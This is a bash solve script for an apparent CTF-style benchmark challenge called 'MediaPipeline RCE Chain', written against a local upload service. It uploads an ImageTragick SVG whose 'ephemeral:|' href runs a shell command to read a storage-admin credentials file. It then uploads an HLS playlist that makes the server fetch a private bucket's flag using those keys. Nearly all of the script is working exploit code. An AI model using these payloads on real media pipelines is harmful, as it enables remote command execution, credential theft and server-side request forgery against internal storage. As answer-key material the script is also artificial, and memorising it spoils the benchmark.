#!/usr/bin/env bash
# APEX-054-25 — "MediaPipeline RCE Chain" (tags: imagetragick, ffmpeg_ssrf, minio)
#
# An upload service that decides what to do with a file by looking at it, and
# two processors that each trust their own format too far.
#
# The image side is ImageTragick: an SVG whose `xlink:href` begins `ephemeral:|`
# hands the rest to a shell. That reads the configuration directory, and the
# configuration directory holds the object store's admin credentials in
# plaintext.
#
# The video side is the HLS playlist. An `.m3u8` is a list of URLs the server
# fetches, which makes uploading one a request for whatever it names — the
# internal object store included, with the credentials the first half found.
#
# Both halves are `--set-file`: a payload with newlines in it is a file, not a
# command-line argument, and what the pipeline dispatches on is the bytes.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex054-$$"
WORK="$(mktemp -d)"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1; rm -rf "$WORK"' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

upload() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/api/upload \
        --set "multipart.file.filename=$(basename "$1")" \
        --set "multipart.file.content_type=$2" \
        --set-file "multipart.file=$1"
}

cat > "$WORK/recon.svg" <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="ephemeral:|cat /app/config/storage-admin.properties"/></svg>
SVG

read -r ENDPOINT KEY SECRET <<<"$(upload "$WORK/recon.svg" image/svg+xml | body | python3 -c '
import json, sys
printed = "\n".join(json.load(sys.stdin)["result"]["command_outputs"])
found = dict(
    line.split("=", 1) for line in printed.splitlines() if "=" in line
)
print(found["storage.endpoint"], found["storage.admin.access_key"],
      found["storage.admin.secret_key"])
')"

# A playlist is a list of things to fetch, and now it names the private bucket.
cat > "$WORK/fetch.m3u8" <<M3U8
#EXTM3U
#EXT-X-TARGETDURATION:10
#EXTINF:10,
$ENDPOINT/internal-secrets/flag.txt?access_key=$KEY&secret_key=$SECRET
#EXT-X-ENDLIST
M3U8

upload "$WORK/fetch.m3u8" application/vnd.apple.mpegurl | flag
